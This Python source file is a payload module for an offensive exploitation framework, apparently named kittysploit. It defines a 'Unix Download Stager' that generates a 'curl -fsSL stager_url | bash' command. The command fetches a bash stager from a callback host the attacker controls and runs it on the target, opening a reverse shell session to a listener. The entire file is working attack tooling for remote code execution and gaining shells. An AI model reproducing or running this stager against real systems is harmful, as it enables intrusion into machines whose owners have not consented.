#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *

from lib.c2.download_stagers import build_curl_pipe_bash, build_stager_url


class Module(Payload):
    __info__ = {
        "name": "Unix Download Stager, curl | bash",
        "description": "curl -fsSL stager_url | bash — no Python required on target",
        "category": PayloadCategory.CMD,
        "platform": Platform.UNIX,
        "listener": "listeners/multi/reverse_tcp",
        "handler": Handler.REVERSE,
        "session_type": SessionType.SHELL,
    }

    lhost = OptString("127.0.0.1", "Callback host (for hosted stager content)", True)
    lport = OptPort(4444, "Callback port", True)
    stager_url = OptString("", "Full URL of hosted bash stager", False)
    stager_port = OptInteger(8000, "HTTP port when stager_url empty", False, advanced=True)

    def generate(self):
        url = str(self.stager_url or "").strip()
        if not url:
            url = build_stager_url(str(self.lhost), int(self.stager_port or 8000), "/stager.sh")
            print_info(f"stager_url not set — using {url}")
        return build_curl_pipe_bash(url)
